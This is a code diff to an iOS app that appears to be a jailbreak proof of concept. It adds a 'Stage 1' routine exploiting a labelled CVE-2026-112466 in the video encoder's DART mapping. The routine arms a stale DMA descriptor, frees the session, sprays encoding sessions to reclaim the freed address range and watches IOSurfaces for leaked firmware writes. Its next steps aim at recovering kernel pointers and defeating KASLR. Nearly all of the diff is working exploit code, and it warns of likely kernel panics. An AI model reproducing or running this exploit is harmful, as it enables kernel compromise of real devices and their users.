@@ -5550,6 +5550,557 @@ static void runExp5_PivotalFork(void) {
 }
 
 // ============================================================
+// STAGE 1: CVE-2026-112466 — DART Re-claim Read
+//
+// A3 FAILED because spray sessions only called PrepareToEncode
+// — Ghidra proved DARTMapInternalSurfaces is ENCODE-PATH ONLY.
+// Surfaces map at first encode, not at session prepare.
+//
+// S1 corrects this:
+// 1. ARM: Alpha=255 encode → -17691, DMA armed
+// 2. FREE: session teardown → DART PTEs freed, stale DVA live
+// 3. RESPAWN WAIT: videocodecd dies with arm; wait for launchd
+// 4. SPRAY+ENCODE: N clean sessions, each encodes ≥1 frame
+//    → DARTMapInternalSurfaces fires → surfaces get DART-mapped
+//    → IORangeAllocator first-fit may reclaim freed DVA range
+// 5. SNAPSHOT: IOSurface scan + full memory snapshot
+// 6. SOAK: 300s, poll every 5s — compare all surfaces
+// 7. DUMP: any changed bytes = firmware DMA write data (infoleak)
+//
+// Two detection channels:
+//  (a) Direct IOSurface diff — catches writes to app-visible surfaces
+//  (b) Bitstream diff — captures encode output for corruption analysis
+// ============================================================
+
+#define S1_SPRAY_COUNT      20
+#define S1_SPRAY_FRAMES      3
+#define S1_SOAK_SECS       300
+#define S1_MAX_SURFACES     64
+#define S1_RESPAWN_WAIT      5
+
+static volatile BOOL g_s1Running = NO;
+
+static void s1Mark(NSString *phase) {
+    NSString *p = [NSHomeDirectory()
+        stringByAppendingPathComponent:@"Documents/s1_phases.txt"];
+    NSString *line = [NSString stringWithFormat:@"%@ %@\n", [NSDate date], phase];
+    FILE *f = fopen(p.fileSystemRepresentation, "a");
+    if (f) { fwrite(line.UTF8String, 1, strlen(line.UTF8String), f); fclose(f); }
+}
+
+static void runStage1_DartRead(void) {
+    if (g_s1Running || g_exp3Running) {
+        INFO(@"Experiment already running");
+        return;
+    }
+    g_s1Running = YES;
+
+    pocLog(@"");
+    pocLog(@"╔═══════════════════════════════════════════╗");
+    pocLog(@"║  STAGE 1: CVE-2026-112466 DART Re-claim   ║");
+    pocLog(@"║  Corrected A3: spray WITH encode           ║");
+    pocLog(@"║  *** WILL LIKELY CAUSE KERNEL PANIC ***    ║");
+    pocLog(@"╚═══════════════════════════════════════════╝");
+    pocLog(@"");
+
+    os_log_t sLog = os_log_create("com.research.jbpoc", "stage1");
+    s1Mark(@"START");
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = YES;
+    });
+
+    NSDateFormatter *tsFmt = [[NSDateFormatter alloc] init];
+    tsFmt.dateFormat = @"HH:mm:ss.SSS";
+
+    // ---- PHASE 1: ARM ----
+    s1Mark(@"P1-arm-start");
+    LOG(@"═══ PHASE 1: ARM (AlphaLayerID=255) ═══");
+
+    g_exp3Armed = NO;
+    g_exp3EncodeStatus = 0;
+    VTCompressionSessionRef armSession = exp3CreateSession(
+        (void *)exp3ArmCallback, YES);
+    if (!armSession) {
+        FAIL(@"Could not create arm session");
+        g_s1Running = NO;
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [UIApplication sharedApplication].idleTimerDisabled = NO;
+        });
+        return;
+    }
+    PASS(@"Arm session created (320x240 HEVC, Alpha=255)");
+
+    CVPixelBufferRef armPB = exp3CreatePixelBuffer(0x80, 0x80);
+    if (!armPB) {
+        FAIL(@"Arm pixel buffer failed");
+        VTCompressionSessionInvalidate(armSession);
+        CFRelease(armSession);
+        g_s1Running = NO;
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [UIApplication sharedApplication].idleTimerDisabled = NO;
+        });
+        return;
+    }
+
+    CMTime armPTS = CMTimeMake(0, 30);
+    VTCompressionSessionEncodeFrame(armSession, armPB,
+        armPTS, kCMTimeInvalid, NULL, NULL, NULL);
+    VTCompressionSessionCompleteFrames(armSession, kCMTimeInvalid);
+    [NSThread sleepForTimeInterval:2.0];
+
+    if (!g_exp3Armed) {
+        FAIL(@"Arm not detected (status %d) — Alpha=255 not triggering", g_exp3EncodeStatus);
+        VTCompressionSessionInvalidate(armSession);
+        CFRelease(armSession);
+        CVPixelBufferRelease(armPB);
+        g_s1Running = NO;
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [UIApplication sharedApplication].idleTimerDisabled = NO;
+        });
+        return;
+    }
+
+    NSString *armedTS = [tsFmt stringFromDate:[NSDate date]];
+    s1Mark([NSString stringWithFormat:@"P1-armed-%@", armedTS]);
+    PASS(@"ARMED: -17691 confirmed at %@", armedTS);
+    os_log(sLog, "STAGE1 P1 armed=YES");
+
+    // ---- PHASE 2: FREE ----
+    s1Mark(@"P2-free-start");
+    LOG(@"");
+    LOG(@"═══ PHASE 2: FREE (Session teardown) ═══");
+    LOG(@"Invalidating armed session — DART PTEs freed.");
+    LOG(@"Stale firmware DMA descriptor persists with freed DVA.");
+
+    NSDate *freeTime = [NSDate date];
+    VTCompressionSessionInvalidate(armSession);
+    CFRelease(armSession);
+    armSession = NULL;
+    CVPixelBufferRelease(armPB);
+    armPB = NULL;
+
+    [NSThread sleepForTimeInterval:0.5];
+    PASS(@"Armed session torn down. Stale DVA is live.");
+    s1Mark(@"P2-freed");
+    os_log(sLog, "STAGE1 P2 freed survived_500ms");
+
+    // ---- PHASE 3: RESPAWN WAIT ----
+    s1Mark(@"P3-respawn-start");
+    LOG(@"");
+    LOG(@"═══ PHASE 3: WAIT %ds (videocodecd respawn) ═══", S1_RESPAWN_WAIT);
+    LOG(@"A2 showed videocodecd dies with arm encode.");
+    LOG(@"launchd respawns it — wait for new instance.");
+
+    [NSThread sleepForTimeInterval:(double)S1_RESPAWN_WAIT];
+    PASS(@"Waited %ds. Attempting spray with encode.", S1_RESPAWN_WAIT);
+    s1Mark(@"P3-respawn-done");
+    os_log(sLog, "STAGE1 P3 respawn_wait=%ds", S1_RESPAWN_WAIT);
+
+    // ---- PHASE 4: SPRAY + ENCODE ----
+    s1Mark(@"P4-spray-start");
+    LOG(@"");
+    LOG(@"═══ PHASE 4: SPRAY + ENCODE (%d sessions × %d frames) ═══",
+        S1_SPRAY_COUNT, S1_SPRAY_FRAMES);
+    LOG(@"*** CRITICAL FIX vs A3: encode triggers DARTMapInternalSurfaces ***");
+    LOG(@"*** Without encode, surfaces are NEVER DART-mapped ***");
+
+    VTCompressionSessionRef spraySessions[S1_SPRAY_COUNT];
+    CVPixelBufferRef sprayPBs[S1_SPRAY_COUNT];
+    int sprayOK = 0;
+    int sprayEncoded = 0;
+
+    exp3FreeSamples();
+
+    for (int i = 0; i < S1_SPRAY_COUNT; i++) {
+        spraySessions[i] = NULL;
+        sprayPBs[i] = NULL;
+
+        VTCompressionSessionRef s = exp3CreateSessionEx(
+            (void *)exp3CollectCallback, 320, 240, NO);
+        if (!s) {
+            INFO(@"Spray stopped at %d (session create failed)", i);
+            break;
+        }
+
+        CVPixelBufferRef pb = exp3CreatePixelBuffer(
+            (uint8_t)(0x40 + i), (uint8_t)(0xC0 + i));
+        if (!pb) {
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            INFO(@"Spray stopped at %d (pixel buffer failed)", i);
+            break;
+        }
+
+        BOOL encodeOK = NO;
+        for (int f = 0; f < S1_SPRAY_FRAMES; f++) {
+            CMTime pts = CMTimeMake(f, 30);
+            OSStatus es = VTCompressionSessionEncodeFrame(s, pb,
+                pts, kCMTimeInvalid, NULL, NULL, NULL);
+            if (es == noErr) encodeOK = YES;
+        }
+        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+        [NSThread sleepForTimeInterval:0.2];
+
+        if (encodeOK) {
+            spraySessions[sprayOK] = s;
+            sprayPBs[sprayOK] = pb;
+            sprayOK++;
+            sprayEncoded++;
+            if ((i + 1) % 5 == 0 || i == 0) {
+                INFO(@"Spray %d/%d: encode OK (total encoded: %d)",
+                     i + 1, S1_SPRAY_COUNT, sprayEncoded);
+            }
+        } else {
+            INFO(@"Spray %d: encode FAILED — videocodecd still dead?", i);
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            CVPixelBufferRelease(pb);
+        }
+    }
+
+    int samplesFromSpray = g_exp3SampleCount;
+    s1Mark([NSString stringWithFormat:@"P4-spray=%d encoded=%d samples=%d",
+            sprayOK, sprayEncoded, samplesFromSpray]);
+    PASS(@"Spray complete: %d sessions encoded, %d bitstream samples captured",
+         sprayEncoded, samplesFromSpray);
+    os_log(sLog, "STAGE1 P4 sprays=%d encoded=%d samples=%d",
+           sprayOK, sprayEncoded, samplesFromSpray);
+
+    if (sprayEncoded == 0) {
+        FAIL(@"ZERO spray sessions encoded — videocodecd not recovered");
+        FAIL(@"Try increasing S1_RESPAWN_WAIT or running again");
+        for (int i = 0; i < sprayOK; i++) {
+            if (spraySessions[i]) {
+                VTCompressionSessionInvalidate(spraySessions[i]);
+                CFRelease(spraySessions[i]);
+            }
+            if (sprayPBs[i]) CVPixelBufferRelease(sprayPBs[i]);
+        }
+        exp3FreeSamples();
+        g_s1Running = NO;
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [UIApplication sharedApplication].idleTimerDisabled = NO;
+        });
+        return;
+    }
+
+    // Store baseline bitstream checksums for corruption detection
+    NSMutableArray *baselineBitstreams = [NSMutableArray array];
+    for (int i = 0; i < samplesFromSpray; i++) {
+        NSData *bs = exp3GetBitstreamData(g_exp3Samples[i]);
+        [baselineBitstreams addObject:(bs ?: [NSData data])];
+        if (i < 5) {
+            INFO(@"  Baseline bitstream[%d]: %zu bytes", i, bs ? bs.length : 0);
+        }
+    }
+
+    // ---- PHASE 5: SNAPSHOT ----
+    s1Mark(@"P5-snapshot-start");
+    LOG(@"");
+    LOG(@"═══ PHASE 5: SNAPSHOT (IOSurface scan + memory baseline) ═══");
+
+    // 5a: Snapshot all spray input pixel buffers
+    uint8_t *spraySnapshots[S1_SPRAY_COUNT];
+    size_t spraySizes[S1_SPRAY_COUNT];
+    for (int i = 0; i < sprayOK; i++) {
+        spraySnapshots[i] = NULL;
+        spraySizes[i] = 0;
+        if (!sprayPBs[i]) continue;
+
+        CVPixelBufferLockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
+        size_t yH = CVPixelBufferGetHeightOfPlane(sprayPBs[i], 0);
+        size_t yBPR = CVPixelBufferGetBytesPerRowOfPlane(sprayPBs[i], 0);
+        size_t uvH = CVPixelBufferGetHeightOfPlane(sprayPBs[i], 1);
+        size_t uvBPR = CVPixelBufferGetBytesPerRowOfPlane(sprayPBs[i], 1);
+        size_t total = yH * yBPR + uvH * uvBPR;
+
+        uint8_t *snap = (uint8_t *)malloc(total);
+        if (snap) {
+            uint8_t *yBase = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(sprayPBs[i], 0);
+            uint8_t *uvBase = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(sprayPBs[i], 1);
+            if (yBase) memcpy(snap, yBase, yH * yBPR);
+            if (uvBase) memcpy(snap + yH * yBPR, uvBase, uvH * uvBPR);
+            spraySnapshots[i] = snap;
+            spraySizes[i] = total;
+        }
+        CVPixelBufferUnlockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
+    }
+    INFO(@"Snapshotted %d spray input surfaces", sprayOK);
+
+    // 5b: Scan IOSurface neighborhood
+    IOSurfaceRef extraSurfs[S1_MAX_SURFACES];
+    uint32_t extraIDs[S1_MAX_SURFACES];
+    uint8_t *extraSnaps[S1_MAX_SURFACES];
+    size_t extraSzs[S1_MAX_SURFACES];
+    int extraCount = 0;
+
+    uint32_t refID = 0;
+    for (int i = 0; i < sprayOK; i++) {
+        IOSurfaceRef ref = CVPixelBufferGetIOSurface(sprayPBs[i]);
+        if (ref) { refID = IOSurfaceGetID(ref); break; }
+    }
+    if (refID == 0) refID = 100;
+
+    uint32_t scanStart = (refID > 16) ? (refID - 16) : 1;
+    uint32_t scanEnd = refID + 64;
+    LOG(@"IOSurface scan: IDs %u to %u (ref=%u)", scanStart, scanEnd, refID);
+
+    for (uint32_t sid = scanStart; sid <= scanEnd && extraCount < S1_MAX_SURFACES; sid++) {
+        BOOL isSprayInput = NO;
+        for (int i = 0; i < sprayOK; i++) {
+            IOSurfaceRef ref = CVPixelBufferGetIOSurface(sprayPBs[i]);
+            if (ref && IOSurfaceGetID(ref) == sid) { isSprayInput = YES; break; }
+        }
+        if (isSprayInput) continue;
+
+        IOSurfaceRef surf = IOSurfaceLookup(sid);
+        if (!surf) continue;
+
+        size_t allocSz = IOSurfaceGetAllocSize(surf);
+        size_t sw = IOSurfaceGetWidth(surf);
+        size_t sh = IOSurfaceGetHeight(surf);
+
+        if (allocSz == 0 || allocSz > 8*1024*1024) {
+            CFRelease(surf);
+            continue;
+        }
+
+        IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
+        void *base = IOSurfaceGetBaseAddress(surf);
+        BOOL stored = NO;
+        if (base) {
+            uint8_t *snap = (uint8_t *)malloc(allocSz);
+            if (snap) {
+                memcpy(snap, base, allocSz);
+                extraSurfs[extraCount] = surf;
+                extraIDs[extraCount] = sid;
+                extraSnaps[extraCount] = snap;
+                extraSzs[extraCount] = allocSz;
+                extraCount++;
+                stored = YES;
+                INFO(@"  IOSurface ID=%u: %zux%zu alloc=%zu — snapshotted", sid, sw, sh, allocSz);
+            }
+        }
+        IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
+        if (!stored) CFRelease(surf);
+    }
+
+    s1Mark([NSString stringWithFormat:@"P5-snapshot sprays=%d extras=%d", sprayOK, extraCount]);
+    PASS(@"Snapshot: %d spray inputs + %d extra IOSurfaces = %d monitored",
+         sprayOK, extraCount, sprayOK + extraCount);
+    os_log(sLog, "STAGE1 P5 sprays=%d extras=%d", sprayOK, extraCount);
+
+    // ---- PHASE 6: SOAK (with monitoring) ----
+    s1Mark(@"P6-soak-start");
+    LOG(@"");
+    LOG(@"═══ PHASE 6: SOAK + MONITOR (%ds, poll every 5s) ═══", S1_SOAK_SECS);
+
+    int elapsed0 = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
+    int soakRemain = S1_SOAK_SECS - elapsed0;
+    if (soakRemain < 120) soakRemain = 120;
+    LOG(@"T+%ds since FREE. Soaking %ds more (to ~T+%d).", elapsed0, soakRemain, elapsed0 + soakRemain);
+    LOG(@"Stale DMA fires ~156s post-arm. Monitoring for surface changes.");
+    LOG(@"ORACLE: survive T+%d + surface changed = INFOLEAK", elapsed0 + soakRemain);
+    pocLog(@"");
+
+    int hitCount = 0;
+    int firstHitTime = -1;
+    NSString *hitDump = nil;
+
+    int ticks = soakRemain / 5;
+    for (int tick = 1; tick <= ticks; tick++) {
+        [NSThread sleepForTimeInterval:5.0];
+        int elapsed = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
+        NSString *now = [tsFmt stringFromDate:[NSDate date]];
+
+        // Channel A: diff spray input surfaces
+        for (int i = 0; i < sprayOK; i++) {
+            if (!sprayPBs[i] || !spraySnapshots[i]) continue;
+            CVPixelBufferLockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
+            uint8_t *yBase = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(sprayPBs[i], 0);
+            size_t yH = CVPixelBufferGetHeightOfPlane(sprayPBs[i], 0);
+            size_t yBPR = CVPixelBufferGetBytesPerRowOfPlane(sprayPBs[i], 0);
+            size_t yTotal = yH * yBPR;
+
+            int diffs = 0;
+            int firstOff = -1;
+            for (size_t b = 0; b < MIN(yTotal, spraySizes[i]); b++) {
+                if (yBase && yBase[b] != spraySnapshots[i][b]) {
+                    if (diffs == 0) firstOff = (int)b;
+                    diffs++;
+                }
+            }
+            CVPixelBufferUnlockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
+
+            if (diffs > 0) {
+                hitCount++;
+                if (firstHitTime < 0) firstHitTime = elapsed;
+                PASS(@"*** SPRAY INPUT HIT: session %d at T+%ds ***", i, elapsed);
+                LOG(@"  %d bytes changed, first at 0x%x", diffs, firstOff);
+                os_log(sLog, "STAGE1 SPRAY-HIT session=%d T+%d diffs=%d first=0x%x",
+                       i, elapsed, diffs, firstOff);
+
+                // Dump first 128 changed bytes
+                CVPixelBufferLockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
+                uint8_t *cur = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(sprayPBs[i], 0);
+                NSMutableString *hex = [NSMutableString string];
+                int dumped = 0;
+                for (size_t b = (size_t)firstOff; b < MIN(yTotal, spraySizes[i]) && dumped < 128; b++) {
+                    if (cur && cur[b] != spraySnapshots[i][b]) {
+                        [hex appendFormat:@"%04zx:%02x→%02x ", b, spraySnapshots[i][b], cur[b]];
+                        dumped++;
+                    }
+                }
+                CVPixelBufferUnlockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
+                LOG(@"  Diff: %@", hex);
+
+                // Full dump to file
+                CVPixelBufferLockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
+                uint8_t *dumpBase = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(sprayPBs[i], 0);
+                if (dumpBase) {
+                    NSData *dumpData = [NSData dataWithBytes:dumpBase length:yTotal];
+                    NSString *dumpPath = [NSHomeDirectory()
+                        stringByAppendingPathComponent:
+                        [NSString stringWithFormat:@"Documents/s1_hit_spray%d_T%d.bin", i, elapsed]];
+                    [dumpData writeToFile:dumpPath atomically:YES];
+                    LOG(@"  Full dump: %@ (%zu bytes)", dumpPath, yTotal);
+                    hitDump = dumpPath;
+                }
+                CVPixelBufferUnlockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
+
+                // Update snapshot for incremental tracking
+                CVPixelBufferLockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
+                uint8_t *updY = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(sprayPBs[i], 0);
+                if (updY) memcpy(spraySnapshots[i], updY, MIN(yTotal, spraySizes[i]));
+                CVPixelBufferUnlockBaseAddress(sprayPBs[i], kCVPixelBufferLock_ReadOnly);
+            }
+        }
+
+        // Channel B: diff extra IOSurfaces
+        for (int si = 0; si < extraCount; si++) {
+            IOSurfaceLock(extraSurfs[si], kIOSurfaceLockReadOnly, NULL);
+            uint8_t *cur = (uint8_t *)IOSurfaceGetBaseAddress(extraSurfs[si]);
+            if (cur) {
+                int eDiffs = 0;
+                int firstE = -1;
+                for (size_t b = 0; b < extraSzs[si]; b++) {
+                    if (cur[b] != extraSnaps[si][b]) {
+                        if (eDiffs == 0) firstE = (int)b;
+                        eDiffs++;
+                    }
+                }
+                if (eDiffs > 0) {
+                    hitCount++;
+                    if (firstHitTime < 0) firstHitTime = elapsed;
+                    PASS(@"*** EXTRA SURF HIT: ID=%u at T+%ds ***", extraIDs[si], elapsed);
+                    LOG(@"  %d bytes changed (of %zu), first at 0x%x", eDiffs, extraSzs[si], firstE);
+                    os_log(sLog, "STAGE1 EXTRA-HIT sid=%u T+%d diffs=%d", extraIDs[si], elapsed, eDiffs);
+
+                    NSMutableString *hex = [NSMutableString string];
+                    int dumped = 0;
+                    for (size_t b = (size_t)firstE; b < extraSzs[si] && dumped < 128; b++) {
+                        if (cur[b] != extraSnaps[si][b]) {
+                            [hex appendFormat:@"%04zx:%02x→%02x ", b, extraSnaps[si][b], cur[b]];
+                            dumped++;
+                        }
+                    }
+                    LOG(@"  Diff: %@", hex);
+
+                    NSData *dumpData = [NSData dataWithBytes:cur length:extraSzs[si]];
+                    NSString *dumpPath = [NSHomeDirectory()
+                        stringByAppendingPathComponent:
+                        [NSString stringWithFormat:@"Documents/s1_hit_extra%u_T%d.bin", extraIDs[si], elapsed]];
+                    [dumpData writeToFile:dumpPath atomically:YES];
+                    LOG(@"  Full dump: %@ (%zu bytes)", dumpPath, extraSzs[si]);
+                    if (!hitDump) hitDump = dumpPath;
+
+                    memcpy(extraSnaps[si], cur, extraSzs[si]);
+                }
+            }
+            IOSurfaceUnlock(extraSurfs[si], kIOSurfaceLockReadOnly, NULL);
+        }
+
+        if (hitCount == 0 && (elapsed <= 30 || elapsed % 30 == 0)) {
+            INFO(@"T+%03ds (%@): no change (%d sprays + %d extras)", elapsed, now, sprayOK, extraCount);
+        }
+
+        if (tick % 12 == 0) {
+            s1Mark([NSString stringWithFormat:@"P6-soak-T+%d hits=%d", elapsed, hitCount]);
+        }
+    }
+
+    int finalElapsed = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
+    s1Mark([NSString stringWithFormat:@"P6-soak-done T+%d hits=%d", finalElapsed, hitCount]);
+    os_log(sLog, "STAGE1 P6 survived T+%d hits=%d", finalElapsed, hitCount);
+
+    // ---- RESULTS ----
+    pocLog(@"");
+    LOG(@"═══════════════════════════════════════════════");
+    if (hitCount > 0) {
+        PASS(@"*** STAGE 1: INFOLEAK DETECTED — %d surface changes ***", hitCount);
+        LOG(@"First hit at T+%ds (fire expected ~T+156)", firstHitTime);
+        LOG(@"Hit data dumped to Documents/s1_hit_*.bin");
+        LOG(@"");
+        LOG(@"NEXT STEPS:");
+        LOG(@"1. Pull s1_hit_*.bin files via AFC/scp");
+        LOG(@"2. Analyze for kernel pointers (0xffff* pattern)");
+        LOG(@"3. Compute KASLR slide from leaked addresses");
+        LOG(@"4. If pointers found → KASLR DEFEATED");
+    } else {
+        PASS(@"*** STAGE 1: SURVIVED T+%d — spray absorbed write ***", finalElapsed);
+        LOG(@"No surface changes detected on app-visible surfaces.");
+        LOG(@"This means the DMA write landed on an INTERNAL surface");
+        LOG(@"(kext-only, not in IOSurfaceLookup namespace).");
+        LOG(@"");
+        LOG(@"NEXT: try encoding AFTER soak to flush firmware data");
+        LOG(@"through CMSampleBuffer callback (bitstream channel).");
+    }
+    LOG(@"═══════════════════════════════════════════════");
+
+    // Write result summary
+    NSString *resultStr = [NSString stringWithFormat:
+        @"STAGE 1 (DART Re-claim Read)\n"
+        @"Date: %@\n"
+        @"Spray sessions: %d (encoded: %d)\n"
+        @"Extra IOSurfaces: %d\n"
+        @"Bitstream samples: %d\n"
+        @"Soak survived: T+%ds\n"
+        @"Hits: %d (first at T+%ds)\n"
+        @"Hit dump: %@\n",
+        [NSDate date], sprayOK, sprayEncoded, extraCount,
+        samplesFromSpray, finalElapsed, hitCount, firstHitTime,
+        hitDump ?: @"(none)"];
+    NSString *resultPath = [NSHomeDirectory()
+        stringByAppendingPathComponent:@"Documents/s1_result.txt"];
+    [resultStr writeToFile:resultPath atomically:YES
+                  encoding:NSUTF8StringEncoding error:nil];
+
+    // ---- CLEANUP ----
+    for (int i = 0; i < sprayOK; i++) {
+        if (spraySessions[i]) {
+            VTCompressionSessionInvalidate(spraySessions[i]);
+            CFRelease(spraySessions[i]);
+        }
+        if (sprayPBs[i]) CVPixelBufferRelease(sprayPBs[i]);
+        if (spraySnapshots[i]) free(spraySnapshots[i]);
+    }
+    for (int i = 0; i < extraCount; i++) {
+        if (extraSnaps[i]) free(extraSnaps[i]);
+        CFRelease(extraSurfs[i]);
+    }
+    exp3FreeSamples();
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [UIApplication sharedApplication].idleTimerDisabled = NO;
+    });
+
+    PASS(@"Stage 1 complete.");
+    s1Mark(@"COMPLETE");
+    g_s1Running = NO;
+}
+
+// ============================================================
 // Tier 1b: OOB trigger — ONLY for properties verified by oracle
 // ============================================================
 
@@ -6167,7 +6718,22 @@ static void runTier2Probe(void) {
     [a5Btn addTarget:self action:@selector(runA5PivotalFork) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:a5Btn];
 
-    CGFloat logTop = row10 + btnH + gap;
+    // Row 11: Stage 1 (full width, prominent)
+    CGFloat row11 = row10 + btnH + gap;
+
+    UIButton *s1Btn = [UIButton buttonWithType:UIButtonTypeSystem];
+    s1Btn.frame = CGRectMake(pad, row11, w - pad * 2, btnH);
+    s1Btn.backgroundColor = [UIColor colorWithRed:0.6 green:0.0 blue:0.0 alpha:1];
+    s1Btn.layer.cornerRadius = 8;
+    s1Btn.layer.borderWidth = 2;
+    s1Btn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.3 blue:0.3 alpha:1].CGColor;
+    s1Btn.titleLabel.font = [UIFont boldSystemFontOfSize:13];
+    [s1Btn setTitle:@"S1: DART Re-claim Read (112466)" forState:UIControlStateNormal];
+    [s1Btn setTitleColor:[UIColor colorWithRed:1.0 green:0.3 blue:0.3 alpha:1] forState:UIControlStateNormal];
+    [s1Btn addTarget:self action:@selector(runStage1) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:s1Btn];
+
+    CGFloat logTop = row11 + btnH + gap;
     self.logView = [[UITextView alloc] initWithFrame:
         CGRectMake(0, logTop, w, self.view.bounds.size.height - logTop)];
     self.logView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
@@ -6327,6 +6893,12 @@ static void runTier2Probe(void) {
 - (void)runA5PivotalFork {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runExp5_PivotalFork();
+    });
+}
+
+- (void)runStage1 {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runStage1_DartRead();
     });
 }
 
